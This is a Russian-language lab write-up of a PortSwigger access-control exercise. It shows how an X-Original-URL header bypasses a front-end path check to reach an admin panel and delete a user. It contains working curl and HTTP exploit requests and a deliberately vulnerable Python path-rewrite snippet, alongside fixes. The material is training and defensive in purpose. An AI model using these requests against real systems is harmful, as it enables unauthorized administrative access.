# Broken Access Control — URL-based access control can be circumvented

| | |
|---|---|
| **Лаба** | [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented) |
| **Уровень** | Practitioner |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-288: Authentication Bypass Using an Alternate Path or Channel |
| **Дата** | 2026-11-08 |
| **Инструменты** | Burp Repeater, curl |

---

## 1. Цель

Получить доступ к панели администратора и удалить пользователя `carlos`.

---

## 2. Уязвимость

Контроль доступа реализован во **фронтенде** и проверяет только путь в первой
строке запроса. **Бэкенд** при этом доверяет заголовку `X-Original-URL`
и строит маршрут по нему.

Два слоя смотрят в разные места — их можно рассогласовать:

```
Клиент → [Front-end: смотрит на путь] → [Back-end: смотрит на X-Original-URL]
```

---

## 3. Обнаружение

1. Открыл `/admin` → `403 Access denied` (ответ отдаёт фронтенд).
2. Предположил, что за прокси стоит фреймворк, поддерживающий переписывание пути.
3. Отправил в Repeater:

```
GET / HTTP/1.1
X-Original-URL: /admin
```

→ `200`, отрисовалась админ-панель. Значит, бэкенд использует заголовок.

---

## 4. Эксплуатация

**Шаг 1 — проверка обхода:**

```bash
curl -i https://<lab>/ -H "X-Original-URL: /admin"
# HTTP/1.1 200 OK → админ-панель
```

**Шаг 2 — удаление пользователя:**

```
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

```bash
curl -i "https://<lab>/?username=carlos" \
  -H "X-Original-URL: /admin/delete"
```

Бэкенд собирает эффективный запрос как `/admin/delete?username=carlos`
и удаляет пользователя.

![Админ-панель через X-Original-URL](img/004-admin-panel.png)

---

## 5. Почему работает

Заголовок несёт только **путь**. Параметры бэкенд берёт из исходной строки
запроса и приклеивает к пути из заголовка. Поэтому запрос «разрезается»:

| Часть запроса | Куда положить | Почему |
|---|---|---|
| Путь `/admin/delete` | `X-Original-URL` | фронтенд проверяет путь → прячем |
| Query `?username=carlos` | строка запроса | не проверяется, бэкенд приклеит сам |

Фронтенд видит путь `/` → пропускает. Бэкенд видит заголовок → маршрутизирует
в `/admin/delete`.

Механизм `X-Original-URL` / `X-Rewrite-URL` существует для доверенного прокси,
но фронтенд не вырезает этот заголовок из внешних запросов. Контроль доступа
и маршрутизация оказываются в разных слоях и расходятся.

---

## 6. Влияние

**В этой лабе:** доступ к админ-функциям и удаление пользователя.

**В общем случае:** обход path-based правил WAF и прокси, доступ к внутренним
и «скрытым» маршрутам (`/internal`, `/actuator`, `/debug`), обход ограничений
на методы и пути. Если так закрыт не только `/admin`, а целые разделы —
компрометация приложения.

---

## 7. Исправление (по приоритету)

1. **Проверять права на бэкенде** — на каждом маршруте, а не только на периметре.
2. **Вырезать `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-*`** из запросов,
   пришедших от клиента (на входном прокси).
3. **Один слой принятия решений**: либо прокси фильтрует, либо приложение
   проверяет — но приложение не должно верить заголовку, пришедшему снаружи.
4. **Не полагаться на path-based правила** как на единственный контроль.
5. **Логировать** обращения к админ-маршрутам.

---

## 8. Как это выглядит в коде

### Плохо

```nginx
# фронтенд блокирует только по пути
location /admin { deny all; }
```

```python
# бэкенд доверяет заголовку, пришедшему от клиента
@app.before_request
def rewrite_path():
    if "X-Original-URL" in request.headers:
        request.path = request.headers["X-Original-URL"]
```

### Хорошо

```python
# 1. заголовки маршрутизации от клиента не принимаем
UNTRUSTED_HEADERS = {"X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"}

@app.before_request
def strip_untrusted_headers():
    for h in UNTRUSTED_HEADERS:
        request.headers.pop(h, None)
```

```python
# 2. права проверяются в приложении, независимо от пути
@app.get("/admin")
def admin(user=Depends(current_user)):
    if user.role != "admin":
        raise HTTPException(status_code=403)
    return render_template("admin.html")
```

---

## 9. Вывод

Контроль доступа, реализованный в одном слое, обходится через другой слой.
Заголовки переписывания пути — это интерфейс доверия между прокси и
приложением; если их не вырезать на входе, клиент может сам назначить, куда
пойдёт запрос.

Отличие от лаб 001–003: там проблема была в логике проверки, здесь — в том,
**где** она реализована.

## 10. Что осталось непонятным

- [ ] Какие ещё заголовки доверия (`X-Forwarded-For`, `X-Forwarded-Host`) можно
      использовать для обхода и подмены
- [ ] Как проверить на реальном проекте, доверяет ли бэкенд заголовкам
      переписывания пути
- [ ] Чем CWE-288 отличается от CWE-863 (Incorrect Authorization)
